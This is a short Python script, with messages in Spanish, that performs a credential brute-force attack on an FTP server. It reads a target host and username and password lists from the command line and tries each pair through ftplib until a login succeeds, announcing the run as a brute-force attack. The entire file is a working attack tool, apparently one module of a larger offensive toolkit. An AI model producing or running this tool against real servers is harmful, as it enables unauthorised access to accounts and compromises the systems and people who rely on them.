import ftplib
import sys
import os
from colorama import init, Fore, Back, Style

try:
	target = sys.argv[1]
	userslist = sys.argv[2]
	passwordlist = sys.argv[3]
except Exception as par:
	print("Error en parametros:", par)
	input("Presione cualquier tecla para salir...")

def ftpBrute(user, password, target):
    try:
        ftp = ftplib.FTP(target)
        estrado = str(ftp.login(user, password.strip("\r\n")))
        print( "Usuario: {:<15} Password: {:<15} [CORRECTO]".format(user,password))
        print(estrado,"\n")
        ftp.close()
        return 1
    except Exception as error:
        print( "Usuario: {:<15} Password: {:<15} [Incorrecto]".format(user,password))
        return 0

try:
    users = open("modulos/bruteforce/"+userslist, "r")
    find=False
    print("Iniciando ataque de fuerza bruta [target: {}]\n".format(target))
    for user in users:
        if find:
            break
        passwords = open("modulos/bruteforce/" + passwordlist, "r")
        user = user.strip()
        for password in passwords:
            password = password.strip()
            try:
                resp = ftpBrute(user, password, target)
                if resp ==1:
                    break
            except Exception as re:
                print("Error(23): ", re)
        passwords.close()
        if resp==1:
            break
    asdf = input("Presione cualquier tecla para salir...")
except Exception as erer:
    print("Error:", erer)
    asdf = input("Presione cualquier tecla para salir...")
